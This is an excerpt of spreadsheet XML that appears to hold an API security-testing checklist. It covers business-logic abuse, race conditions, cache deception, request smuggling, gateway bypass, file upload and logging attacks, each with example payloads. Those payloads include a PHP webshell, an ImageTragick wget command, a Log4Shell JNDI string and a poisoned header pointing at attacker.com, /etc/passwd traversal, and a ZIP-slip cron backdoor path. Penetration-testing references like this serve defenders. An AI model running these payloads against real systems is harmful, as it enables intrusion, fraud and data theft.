    <t xml:space="preserve">API-16-001</t>
  </si>
  <si>
    <t xml:space="preserve">Business Logic &amp; Workflow Abuse</t>
  </si>
  <si>
    <t xml:space="preserve">Workflow step-skipping</t>
  </si>
  <si>
    <t xml:space="preserve">Multi-step workflows that authorize each step independently allow skipping. POST directly to the final step's endpoint.</t>
  </si>
  <si>
    <t xml:space="preserve">Skip: step1 → step2 → step3 by POSTing directly to /v1/checkout/complete with state from observed normal flow</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP API Security Top 10 - API6:2023</t>
  </si>
  <si>
    <t xml:space="preserve">API-16-002</t>
  </si>
  <si>
    <t xml:space="preserve">Price / quantity manipulation</t>
  </si>
  <si>
    <t xml:space="preserve">Modify price or quantity client-side before submission. Server-side validation often missing for free items, discounts, refunds.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/cart {"item":1,"price":0.01,"quantity":-1} | Negative quantity may credit account | Free item via price tampering</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Business logic testing</t>
  </si>
  <si>
    <t xml:space="preserve">API-16-003</t>
  </si>
  <si>
    <t xml:space="preserve">Currency confusion</t>
  </si>
  <si>
    <t xml:space="preserve">Pay in a lower-value currency than priced. The server checks amount but not currency, accepting 100 IDR as 100 USD.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/checkout {"amount":100,"currency":"IDR"} | Test if currency is validated against price</t>
  </si>
  <si>
    <t xml:space="preserve">API-16-004</t>
  </si>
  <si>
    <t xml:space="preserve">Coupon / voucher stacking</t>
  </si>
  <si>
    <t xml:space="preserve">Apply the same coupon repeatedly, apply multiple stack-incompatible coupons, or apply an expired coupon.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/apply-coupon {"code":"SAVE50"} x N | Mix exclusive coupons | Try expired/used codes</t>
  </si>
  <si>
    <t xml:space="preserve">API-16-005</t>
  </si>
  <si>
    <t xml:space="preserve">Single-packet race condition</t>
  </si>
  <si>
    <t xml:space="preserve">Send 20-30 HTTP/2 requests in one TCP packet to nullify network jitter and exploit limit-overrun (coupon redeem, withdraw, vote). James Kettle BH USA 2023 / DEF CON 31.</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Repeater &gt; tab groups &gt; Send group in parallel (single packet) | Turbo Intruder race-single-packet template</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/research/the-single-packet-attack</t>
  </si>
  <si>
    <t xml:space="preserve">API-16-006</t>
  </si>
  <si>
    <t xml:space="preserve">TOCTOU on financial operations</t>
  </si>
  <si>
    <t xml:space="preserve">Race between balance check and commit. Two simultaneous withdrawals both pass the balance check, both succeed.</t>
  </si>
  <si>
    <t xml:space="preserve">Concurrent: POST /v1/withdraw {"amount":100} x 5 with balance=100 | Verify final state</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Race Conditions</t>
  </si>
  <si>
    <t xml:space="preserve">API-16-007</t>
  </si>
  <si>
    <t xml:space="preserve">Idempotency-key reuse exploitation</t>
  </si>
  <si>
    <t xml:space="preserve">Replay a request with the same idempotency key to double-process (when backend caches result but doesn't enforce side-effect dedup) or reuse a cached result.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/payments idempotency-key: abc with amount=100 | Replay with key abc and amount=10000</t>
  </si>
  <si>
    <t xml:space="preserve">stripe.com/blog/idempotency</t>
  </si>
  <si>
    <t xml:space="preserve">API-16-008</t>
  </si>
  <si>
    <t xml:space="preserve">Refund / void abuse</t>
  </si>
  <si>
    <t xml:space="preserve">Refund more than was paid; refund an already-refunded payment; refund using a different user's payment.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/refunds {"payment_id":"&lt;self&gt;","amount":9999999} | refund victim's payment to self</t>
  </si>
  <si>
    <t xml:space="preserve">API-16-009</t>
  </si>
  <si>
    <t xml:space="preserve">Integer overflow on amounts</t>
  </si>
  <si>
    <t xml:space="preserve">Submit values near MAX_INT, MIN_INT, or float-precision boundaries to wrap totals.</t>
  </si>
  <si>
    <t xml:space="preserve">amount: 2147483647 + 1 (int32 overflow) | amount: 9999999999999999 (float64 precision) | amount: -2147483648</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org/www-community/vulnerabilities/Integer_overflow</t>
  </si>
  <si>
    <t xml:space="preserve">API-16-010</t>
  </si>
  <si>
    <t xml:space="preserve">Negative-value abuse</t>
  </si>
  <si>
    <t xml:space="preserve">Negative quantities/amounts that credit the user instead of debiting. Common in transfer/withdraw flows.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/transfer {"amount":-100,"to":"&lt;self&gt;"} | POST /v1/cart {"quantity":-5,"price":100}</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Business logic</t>
  </si>
  <si>
    <t xml:space="preserve">API-16-011</t>
  </si>
  <si>
    <t xml:space="preserve">Multi-step transaction state manipulation</t>
  </si>
  <si>
    <t xml:space="preserve">Tamper with intermediate state tokens (cart_id, session_id, transaction_id) to merge sessions or hijack another user's transaction.</t>
  </si>
  <si>
    <t xml:space="preserve">Capture and modify state token between checkout steps | Submit attacker's cart with victim's transaction_id</t>
  </si>
  <si>
    <t xml:space="preserve">API-16-012</t>
  </si>
  <si>
    <t xml:space="preserve">Replay of non-idempotent operations</t>
  </si>
  <si>
    <t xml:space="preserve">Replay captured signed requests. Without nonce/timestamp validation, replay double-processes.</t>
  </si>
  <si>
    <t xml:space="preserve">Capture signed POST /v1/transfer | Replay N times | Verify multiple transactions occurred</t>
  </si>
  <si>
    <t xml:space="preserve">RFC 5246 - replay protection</t>
  </si>
  <si>
    <t xml:space="preserve">API-16-013</t>
  </si>
  <si>
    <t xml:space="preserve">First-sequence-sync race condition (beyond 1500 bytes)</t>
  </si>
  <si>
    <t xml:space="preserve">RyotaK / GMO Flatt Security extension of single-packet attack past 1500-byte and 65535-byte limits, for large-request races.</t>
  </si>
  <si>
    <t xml:space="preserve">Turbo Intruder first-sequence-sync gadget | For requests with bodies &gt; 1.5KB (e.g., large GraphQL ops)</t>
  </si>
  <si>
    <t xml:space="preserve">flatt.tech/research</t>
  </si>
  <si>
    <t xml:space="preserve">API-17-001</t>
  </si>
  <si>
    <t xml:space="preserve">Caching, CDN &amp; Infra</t>
  </si>
  <si>
    <t xml:space="preserve">Web cache deception via path confusion</t>
  </si>
  <si>
    <t xml:space="preserve">Append a static-looking suffix to a dynamic personalized endpoint. CDN treats it as cacheable static; cache serves victim's personalized response to attacker.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /account/wallet.css | /api/me.css | /profile.js | Test if response = personalized data despite static extension</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/research/gotta-cache-em-all (Doyhenard, BH USA 2024)</t>
  </si>
  <si>
    <t xml:space="preserve">API-17-002</t>
  </si>
  <si>
    <t xml:space="preserve">Cache-key normalization discrepancy</t>
  </si>
  <si>
    <t xml:space="preserve">Cloudflare/Akamai/Fastly and origin (Nginx/IIS) normalize URLs differently — delimiters (#, ;, %00) handled inconsistently. Poisons cache with attacker-controlled variant.</t>
  </si>
  <si>
    <t xml:space="preserve">Test: /api/data;dummy.css | /api/data%23.css | /api/data%00.css | Cache key vs origin path</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/research - cache normalization</t>
  </si>
  <si>
    <t xml:space="preserve">API-17-003</t>
  </si>
  <si>
    <t xml:space="preserve">Cache poisoning via unkeyed headers</t>
  </si>
  <si>
    <t xml:space="preserve">Headers like X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL influence response content but aren't included in cache key. Poison once, served to all.</t>
  </si>
  <si>
    <t xml:space="preserve">Tool: Param Miner | GET /api/data X-Forwarded-Host: attacker.com | Check if poisoned response served to next requester</t>
  </si>
  <si>
    <t xml:space="preserve">API-17-004</t>
  </si>
  <si>
    <t xml:space="preserve">Cache Deception Armor bypass via uncommon extension</t>
  </si>
  <si>
    <t xml:space="preserve">Cloudflare's Cache Deception Armor protects a list of known static extensions. Novel/uncommon extensions (.avif, .webp, .json5) outside the list still work.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /account/wallet.avif | /api/me.webp | HackerOne #439021 (Cloudflare)</t>
  </si>
  <si>
    <t xml:space="preserve">hackerone.com/reports/439021</t>
  </si>
  <si>
    <t xml:space="preserve">API-17-005</t>
  </si>
  <si>
    <t xml:space="preserve">HTTP/2 to HTTP/1.1 downgrade smuggling</t>
  </si>
  <si>
    <t xml:space="preserve">Gateways accepting HTTP/2 frontside but downgrading to HTTP/1.1 backside re-introduce CL/TE ambiguity. H2.CL and H2.TE variants.</t>
  </si>
  <si>
    <t xml:space="preserve">Tool: PortSwigger HTTP Request Smuggler v3+ | Test via Burp HTTP/2 tab + downgrade button</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/research - HTTP/2 smuggling</t>
  </si>
  <si>
    <t xml:space="preserve">API-17-006</t>
  </si>
  <si>
    <t xml:space="preserve">CL.TE / TE.CL / TE.TE smuggling</t>
  </si>
  <si>
    <t xml:space="preserve">Classic HTTP/1.1 desync. Chained proxies disagree on which length header to honor.</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger HTTP Request Smuggler &gt; Launch smuggle scan | Manual: Transfer-Encoding obfuscation</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/research/http-desync-attacks-request-smuggling-reborn</t>
  </si>
  <si>
    <t xml:space="preserve">API-17-007</t>
  </si>
  <si>
    <t xml:space="preserve">CL.0 request smuggling</t>
  </si>
  <si>
    <t xml:space="preserve">Backend ignores Content-Length on certain endpoints (often static /resources/*). Smuggle a second request through the connection.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /resources HTTP/1.1 / Content-Length: 35 // GET /admin/delete?username=carlos HTTP/1.1</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/request-smuggling/browser/cl-0</t>
  </si>
  <si>
    <t xml:space="preserve">API-17-008</t>
  </si>
  <si>
    <t xml:space="preserve">0.CL request smuggling</t>
  </si>
  <si>
    <t xml:space="preserve">Hide Content-Length from frontend via whitespace obfuscation. Use early-response gadget to break the deadlock. James Kettle BH USA 2025 — CVE-2025-32094 (Akamai), CVE-2025-4366 (Cloudflare), &gt;$350K bounties.</t>
  </si>
  <si>
    <t xml:space="preserve">HTTP Request Smuggler v3.0 (Aug 2025 release) &gt; 0.CL probe | Test against any CDN/proxy + backend pair</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/research - HTTP/1.1 Must Die (BH USA 2025)</t>
  </si>
  <si>
    <t xml:space="preserve">API-17-009</t>
  </si>
  <si>
    <t xml:space="preserve">Client-side / browser-powered desync</t>
  </si>
  <si>
    <t xml:space="preserve">Poison the victim browser's connection pool with a malformed request, then deliver the smuggled exploit to the next request on the same connection.</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger Browser Cache Exploit Tool | Requires victim to visit attacker page</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/research/browser-powered-desync-attacks</t>
  </si>
  <si>
    <t xml:space="preserve">API-17-010</t>
  </si>
  <si>
    <t xml:space="preserve">Hop-by-hop header abuse</t>
  </si>
  <si>
    <t xml:space="preserve">Connection: X header instructs the next hop to strip header X. Attacker can strip security-relevant headers before they reach the backend.</t>
  </si>
  <si>
    <t xml:space="preserve">Connection: Authorization | Connection: X-CSRF-Token | Test if downstream headers stripped</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org - HTTP header abuse</t>
  </si>
  <si>
    <t xml:space="preserve">API-17-011</t>
  </si>
  <si>
    <t xml:space="preserve">X-Forwarded-* trust abuse on gateway</t>
  </si>
  <si>
    <t xml:space="preserve">Gateway trusts X-Forwarded-For for client IP, X-Forwarded-Host for routing, etc. Spoof to bypass IP allowlists or hit internal hosts.</t>
  </si>
  <si>
    <t xml:space="preserve">X-Forwarded-For: 127.0.0.1 | X-Forwarded-Host: internal-admin | X-Forwarded-Proto: https</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net - host header attacks</t>
  </si>
  <si>
    <t xml:space="preserve">API-17-012</t>
  </si>
  <si>
    <t xml:space="preserve">Parser-discrepancy detection (HTTP Request Smuggler v3.0)</t>
  </si>
  <si>
    <t xml:space="preserve">Burp extension v3.0 (Aug 2025) systematically detects parser discrepancies across four length interpretations: CL, TE, 0 (implicit-zero), H2 (HTTP/2 built-in length).</t>
  </si>
  <si>
    <t xml:space="preserve">Burp &gt; Extensions &gt; HTTP Request Smuggler v3+ &gt; Probe for CL/TE/0/H2 discrepancies</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/portswigger/http-request-smuggler</t>
  </si>
  <si>
    <t xml:space="preserve">API-18-001</t>
  </si>
  <si>
    <t xml:space="preserve">API Gateway &amp; Microservices</t>
  </si>
  <si>
    <t xml:space="preserve">Auth bypass via direct backend access</t>
  </si>
  <si>
    <t xml:space="preserve">Reach backend services directly, bypassing the gateway-only auth check. Find backend IPs via certificate SANs, error messages, DNS, or SSRF.</t>
  </si>
  <si>
    <t xml:space="preserve">Discover backend IP | curl --resolve api-backend.internal:443:&lt;IP&gt; https://api-backend.internal/admin</t>
  </si>
  <si>
    <t xml:space="preserve">API-18-002</t>
  </si>
  <si>
    <t xml:space="preserve">Service-to-service auth weakness</t>
  </si>
  <si>
    <t xml:space="preserve">Internal RPCs assume the caller is another microservice and skip auth. Reach them via SSRF or compromised pod.</t>
  </si>
  <si>
    <t xml:space="preserve">Find /internal/, /rpc/ endpoints | Call without auth | Look for trust-on-network</t>
  </si>
  <si>
    <t xml:space="preserve">API-18-003</t>
  </si>
  <si>
    <t xml:space="preserve">IP-allowlist bypass via header spoof</t>
  </si>
  <si>
    <t xml:space="preserve">Gateway honors X-Forwarded-For for the allowlist check. Spoof an internal IP to satisfy the allowlist.</t>
  </si>
  <si>
    <t xml:space="preserve">X-Forwarded-For: 10.0.0.1 | X-Real-IP: 192.168.1.1 | Test both single and chained values</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net - header abuse</t>
  </si>
  <si>
    <t xml:space="preserve">API-18-004</t>
  </si>
  <si>
    <t xml:space="preserve">JWT validated only at edge</t>
  </si>
  <si>
    <t xml:space="preserve">Gateway validates JWT then forwards request with original auth. Backend trusts gateway and accepts any forwarded JWT (or no JWT).</t>
  </si>
  <si>
    <t xml:space="preserve">Bypass gateway, send forged JWT directly to backend | Send no auth at all</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - microservice security</t>
  </si>
  <si>
    <t xml:space="preserve">API-18-005</t>
  </si>
  <si>
    <t xml:space="preserve">Internal API exposure</t>
  </si>
  <si>
    <t xml:space="preserve">Internal-only routes externally reachable. Common during migration, after misconfigured ingress, or via path-based routing bugs.</t>
  </si>
  <si>
    <t xml:space="preserve">Probe: /internal/*, /admin/internal/*, /api/private/* | Verify in 200/401/403 responses</t>
  </si>
  <si>
    <t xml:space="preserve">API-18-006</t>
  </si>
  <si>
    <t xml:space="preserve">Service-mesh sidecar bypass</t>
  </si>
  <si>
    <t xml:space="preserve">Bypass Istio/Envoy mTLS by hitting the pod IP directly instead of routing through the service mesh. The sidecar enforces mTLS only on the mesh path.</t>
  </si>
  <si>
    <t xml:space="preserve">Find pod IP via SSRF/kubelet | Connect to pod:8080 (app port) bypassing sidecar</t>
  </si>
  <si>
    <t xml:space="preserve">istio.io/docs - security</t>
  </si>
  <si>
    <t xml:space="preserve">API-18-007</t>
  </si>
  <si>
    <t xml:space="preserve">Kubernetes API exposure</t>
  </si>
  <si>
    <t xml:space="preserve">kube-apiserver, kubelet, etcd reachable via API endpoint or SSRF. Often unauthenticated on internal network.</t>
  </si>
  <si>
    <t xml:space="preserve">GET http://kubelet:10250/pods (via SSRF) | http://kube-apiserver:8080/api/v1/namespaces</t>
  </si>
  <si>
    <t xml:space="preserve">kubernetes.io - security audit</t>
  </si>
  <si>
    <t xml:space="preserve">API-18-008</t>
  </si>
  <si>
    <t xml:space="preserve">Istio / Envoy misconfig</t>
  </si>
  <si>
    <t xml:space="preserve">Permissive AuthorizationPolicy, missing namespace isolation, header trust without validation.</t>
  </si>
  <si>
    <t xml:space="preserve">Review policy via SSRF: http://istiod:15014/debug/configz | Test mTLS enforcement</t>
  </si>
  <si>
    <t xml:space="preserve">istio.io/docs - troubleshooting</t>
  </si>
  <si>
    <t xml:space="preserve">API-18-009</t>
  </si>
  <si>
    <t xml:space="preserve">JSON parser differential (gateway vs backend)</t>
  </si>
  <si>
    <t xml:space="preserve">Different JSON parsers handle duplicate keys differently. Bishop Fox showed 7 of 49 parsers take the first value, Go takes the last. Gateway validates one value; backend acts on another.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/transfer {"qty":1,"qty":-1000} | Test if validator/processor disagree | Lab: bishopfox.com/json-interop-vuln-labs</t>
  </si>
  <si>
    <t xml:space="preserve">API-18-010</t>
  </si>
  <si>
    <t xml:space="preserve">Truncation / key-collision differential</t>
  </si>
  <si>
    <t xml:space="preserve">Unicode surrogate (qty\ud800) or comment-based key truncation makes one parser see two keys, another see one. Authz bypass / privilege escalation.</t>
  </si>
  <si>
    <t xml:space="preserve">{"role\u0000":"admin","role":"user"} | {"qty/*comment*/":1,"qty":-1}</t>
  </si>
  <si>
    <t xml:space="preserve">bishopfox.com/json-interop-vuln-labs</t>
  </si>
  <si>
    <t xml:space="preserve">API-19-001</t>
  </si>
  <si>
    <t xml:space="preserve">File Handling via API</t>
  </si>
  <si>
    <t xml:space="preserve">Unrestricted file upload (RCE)</t>
  </si>
  <si>
    <t xml:space="preserve">Upload server-side executable files (.php, .jsp, .aspx, .py) and access them directly to execute code.</t>
  </si>
  <si>
    <t xml:space="preserve">Upload shell.php; access /uploads/shell.php?cmd=id | Try alternative extensions: .phtml, .phar, .php7</t>
  </si>
  <si>
    <t xml:space="preserve">API-19-002</t>
  </si>
  <si>
    <t xml:space="preserve">Content-type confusion upload</t>
  </si>
  <si>
    <t xml:space="preserve">Bypass MIME validation by setting Content-Type: image/png while body is a webshell, or via magic-byte prepending.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /upload Content-Type: image/png Body: &lt;?php system($_GET['c']); ?&gt; | GIF89a; &lt;?php system($_GET['c']); ?&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">API-19-003</t>
  </si>
  <si>
    <t xml:space="preserve">Polyglot file upload</t>
  </si>
  <si>
    <t xml:space="preserve">Files that are valid in multiple formats (GIFAR = GIF+JAR, phar polyglots). Bypasses format-specific validation while executing as the second format.</t>
  </si>
  <si>
    <t xml:space="preserve">Create GIFAR with jar tool | Create phar/JPG polyglot for PHP RCE</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org - polyglot files</t>
  </si>
  <si>
    <t xml:space="preserve">API-19-004</t>
  </si>
  <si>
    <t xml:space="preserve">Path traversal in download endpoints</t>
  </si>
  <si>
    <t xml:space="preserve">Download endpoints that take a filename parameter without sanitization allow ../ traversal to read any file.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /v1/download?file=../../../etc/passwd | %2e%2e%2f | ..%c0%af.. | Test absolute paths</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org - Path Traversal</t>
  </si>
  <si>
    <t xml:space="preserve">API-19-005</t>
  </si>
  <si>
    <t xml:space="preserve">ZIP slip in archive upload</t>
  </si>
  <si>
    <t xml:space="preserve">Archive entries with ../ in their names extract outside the target directory, allowing arbitrary file write.</t>
  </si>
  <si>
    <t xml:space="preserve">Create ZIP with entry: ../../../etc/cron.d/backdoor | Tool: zipslip-cli</t>
  </si>
  <si>
    <t xml:space="preserve">snyk.io/research/zip-slip-vulnerability</t>
  </si>
  <si>
    <t xml:space="preserve">API-19-006</t>
  </si>
  <si>
    <t xml:space="preserve">Image-parsing RCE (ImageMagick chains)</t>
  </si>
  <si>
    <t xml:space="preserve">ImageTragick and successors exploit MVG/MSL/SVG/EPS parsing in ImageMagick for RCE.</t>
  </si>
  <si>
    <t xml:space="preserve">Upload malicious MVG/SVG: push graphic-context viewbox 0 0 640 480 fill 'url(https://example.com/image.jpg|wget$IFS$1xxx);'</t>
  </si>
  <si>
    <t xml:space="preserve">imagetragick.com</t>
  </si>
  <si>
    <t xml:space="preserve">API-19-007</t>
  </si>
  <si>
    <t xml:space="preserve">PDF-generation SSRF / RCE</t>
  </si>
  <si>
    <t xml:space="preserve">wkhtmltopdf, Puppeteer, and similar tools execute HTML server-side. Inject internal-URL fetches or JS for SSRF.</t>
  </si>
  <si>
    <t xml:space="preserve">Inject &lt;iframe src=file:///etc/passwd&gt; | &lt;iframe src=http://169.254.169.254/...&gt; | &lt;script&gt;fetch('//internal/')&lt;/script&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">API-19-008</t>
  </si>
  <si>
    <t xml:space="preserve">File download IDOR</t>
  </si>
  <si>
    <t xml:space="preserve">Download endpoints that authorize by file ID without checking ownership.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /v1/files/&lt;victim_file_id&gt;/download | Iterate file IDs with attacker token</t>
  </si>
  <si>
    <t xml:space="preserve">API-19-009</t>
  </si>
  <si>
    <t xml:space="preserve">SVG XSS / XXE on upload</t>
  </si>
  <si>
    <t xml:space="preserve">SVG files contain JS and XML. Uploaded SVGs may execute scripts when served, or trigger XXE in server-side processing.</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt; | SVG with XXE entity for file read</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org - SVG security</t>
  </si>
  <si>
    <t xml:space="preserve">API-20-001</t>
  </si>
  <si>
    <t xml:space="preserve">Improper Inventory Management (API9:2023)</t>
  </si>
  <si>
    <t xml:space="preserve">Old API versions live</t>
  </si>
  <si>
    <t xml:space="preserve">/v1 unpatched while /v2 is fixed. Common when deprecation isn't enforced.</t>
  </si>
  <si>
    <t xml:space="preserve">Test all version paths: /v1, /v2, /v3 | Compare behavior on known-patched issues</t>
  </si>
  <si>
    <t xml:space="preserve">API-20-002</t>
  </si>
  <si>
    <t xml:space="preserve">Dev / staging APIs exposed</t>
  </si>
  <si>
    <t xml:space="preserve">staging-api.target.com, dev-api.target.com with debug enabled, introspection on, weak auth. Goctopus regularly finds these.</t>
  </si>
  <si>
    <t xml:space="preserve">DNS enum for dev., staging., test., qa., uat. prefixes | Test introspection, debug flags</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/Escape-Technologies/goctopus</t>
  </si>
  <si>
    <t xml:space="preserve">API-20-003</t>
  </si>
  <si>
    <t xml:space="preserve">Debug endpoints in production</t>
  </si>
  <si>
    <t xml:space="preserve">/debug, /trace, /profiler, /actuator/* exposed in production. Reveals config, env vars, sometimes RCE.</t>
  </si>
  <si>
    <t xml:space="preserve">Probe: /debug, /actuator/env, /actuator/heapdump, /profiler, /trace.axd</t>
  </si>
  <si>
    <t xml:space="preserve">API-20-004</t>
  </si>
  <si>
    <t xml:space="preserve">API documentation leak in production</t>
  </si>
  <si>
    <t xml:space="preserve">Swagger UI, Redoc, GraphQL Playground accessible in production. Reveals full endpoint surface and example payloads.</t>
  </si>
  <si>
    <t xml:space="preserve">Paths: /swagger-ui, /api-docs, /docs, /redoc, /graphql (GET in browser shows playground)</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - documentation security</t>
  </si>
  <si>
    <t xml:space="preserve">API-20-005</t>
  </si>
  <si>
    <t xml:space="preserve">Deprecated endpoints lacking patches</t>
  </si>
  <si>
    <t xml:space="preserve">Endpoints removed from docs but still live. Same code path, no security updates.</t>
  </si>
  <si>
    <t xml:space="preserve">Wayback Machine for old docs | Compare current API list to historical | Test removed endpoints</t>
  </si>
  <si>
    <t xml:space="preserve">API-20-006</t>
  </si>
  <si>
    <t xml:space="preserve">Cross-environment endpoint access</t>
  </si>
  <si>
    <t xml:space="preserve">Prod token works on staging or vice versa. Shared auth backend without environment-scoped tokens.</t>
  </si>
  <si>
    <t xml:space="preserve">Use prod token at staging-api.target.com | Use staging token at api.target.com</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - environment isolation</t>
  </si>
  <si>
    <t xml:space="preserve">API-20-007</t>
  </si>
  <si>
    <t xml:space="preserve">Shadow / undocumented endpoints</t>
  </si>
  <si>
    <t xml:space="preserve">Endpoints not in any documentation but reachable. Autoswagger and similar tools reveal these.</t>
  </si>
  <si>
    <t xml:space="preserve">autoswagger -u api.target.com | Diff revealed endpoints vs documented</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/intruder-io/autoswagger</t>
  </si>
  <si>
    <t xml:space="preserve">API-21-001</t>
  </si>
  <si>
    <t xml:space="preserve">Unsafe Consumption of APIs (API10:2023)</t>
  </si>
  <si>
    <t xml:space="preserve">Blind trust in third-party API data</t>
  </si>
  <si>
    <t xml:space="preserve">App passes upstream API response into SQL/template/exec without validation. Injection via consumed upstream data.</t>
  </si>
  <si>
    <t xml:space="preserve">If app calls weather API and uses temperature in SQL, MITM the upstream response with SQLi payload</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP API Security Top 10 - API10:2023</t>
  </si>
  <si>
    <t xml:space="preserve">API-21-002</t>
  </si>
  <si>
    <t xml:space="preserve">Redirect following without validation</t>
  </si>
  <si>
    <t xml:space="preserve">App follows redirects from upstream without re-validating destination. SSRF via upstream 302 to internal IP.</t>
  </si>
  <si>
    <t xml:space="preserve">Compromise upstream to return: HTTP/1.1 302 Found / Location: http://169.254.169.254/ | App fetches internal</t>
  </si>
  <si>
    <t xml:space="preserve">API-21-003</t>
  </si>
  <si>
    <t xml:space="preserve">Second-order injection via stored API data</t>
  </si>
  <si>
    <t xml:space="preserve">Payload from partner API stored in DB then executed later in a different context. Classic stored-XSS via API integration.</t>
  </si>
  <si>
    <t xml:space="preserve">Submit XSS via /partner/sync endpoint | XSS executes when admin views in dashboard</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Second-Order Injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-21-004</t>
  </si>
  <si>
    <t xml:space="preserve">Missing validation on trusted-source data</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP API10:2023 notes 'developers trust third-party data more than user input.' Partner data treated as safe.</t>
  </si>
  <si>
    <t xml:space="preserve">Audit how partner/integration data is sanitized vs user data | Test inputs from partner endpoint</t>
  </si>
  <si>
    <t xml:space="preserve">API-21-005</t>
  </si>
  <si>
    <t xml:space="preserve">Supply-chain abuse of API client libraries</t>
  </si>
  <si>
    <t xml:space="preserve">Compromised SDK/dependency leaks tokens, exfils data, or backdoors auth.</t>
  </si>
  <si>
    <t xml:space="preserve">Audit dependencies: npm audit, snyk, dependabot | Verify SDK source hashes match published</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Supply chain</t>
  </si>
  <si>
    <t xml:space="preserve">API-22-001</t>
  </si>
  <si>
    <t xml:space="preserve">Logging, Monitoring &amp; Observability (API8:2023)</t>
  </si>
  <si>
    <t xml:space="preserve">Missing audit logs</t>
  </si>
  <si>
    <t xml:space="preserve">No record of auth failures, privileged actions, or data exfiltration. Forensics impossible after breach.</t>
  </si>
  <si>
    <t xml:space="preserve">Trigger login failures, admin actions, data exports | Audit logging configuration</t>
  </si>
  <si>
    <t xml:space="preserve">API-22-002</t>
  </si>
  <si>
    <t xml:space="preserve">CRLF in inputs to forge fake log entries. Confuses audit trails and SIEM detection.</t>
  </si>
  <si>
    <t xml:space="preserve">User-Agent: foo%0d%0a2025-01-01 [INFO] admin login_success | Inject newlines in any logged field</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org - Log Injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-22-003</t>
  </si>
  <si>
    <t xml:space="preserve">Log4Shell-class JNDI injection</t>
  </si>
  <si>
    <t xml:space="preserve">Vulnerable logging frameworks (Log4j 2.x &lt; 2.17.1) evaluate ${jndi:ldap://attacker/} in any logged input.</t>
  </si>
  <si>
    <t xml:space="preserve">Header: User-Agent: ${jndi:ldap://attacker.com/x} | Body fields, query params | Test all loggable inputs</t>
  </si>
  <si>
    <t xml:space="preserve">logging.apache.org/log4j - CVE-2021-44228</t>
  </si>
  <si>
    <t xml:space="preserve">API-22-004</t>
  </si>
  <si>
    <t xml:space="preserve">Sensitive data in logs</t>
  </si>
  <si>
    <t xml:space="preserve">Tokens, PII, full request bodies, password hashes logged. Compromise of log infrastructure leaks all data.</t>
  </si>
  <si>
    <t xml:space="preserve">Audit log content: search for Authorization, password, ssn, credit_card patterns in log samples</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Logging Cheat Sheet</t>
  </si>
  <si>
    <t xml:space="preserve">API-22-005</t>
  </si>
  <si>
    <t xml:space="preserve">Debug logs in production</t>
  </si>
  <si>
    <t xml:space="preserve">DEBUG-level logging in prod reveals internal flow, SQL queries, stack traces.</t>
  </si>
  <si>
    <t xml:space="preserve">Trigger errors | Check response for SQL/path/stack disclosure | Internal-facing log access if SSRF</t>
  </si>
  <si>
    <t xml:space="preserve">API-22-006</t>
  </si>
  <si>
    <t xml:space="preserve">Stack trace / SQL / path disclosure in errors</t>
  </si>
  <si>
    <t xml:space="preserve">Verbose 500 responses leak internal paths, SQL queries, framework versions.</t>
  </si>
  <si>
    <t xml:space="preserve">Trigger 500 via malformed input | Read returned stack traces | Note framework version for known CVEs</t>
  </si>
  <si>
    <t xml:space="preserve">API-23-001</t>
  </si>
  <si>
    <t xml:space="preserve">Niche &amp; Emerging Vectors (2024-2026)</t>
  </si>
  <si>
    <t xml:space="preserve">JSON interoperability number-handling</t>
  </si>
  <si>
    <t xml:space="preserve">Large integers decoded differently across parsers. Bishop Fox lab: validator sees 0, processor sees 9999999. Free items / unlimited credit.</t>
  </si>
  <si>
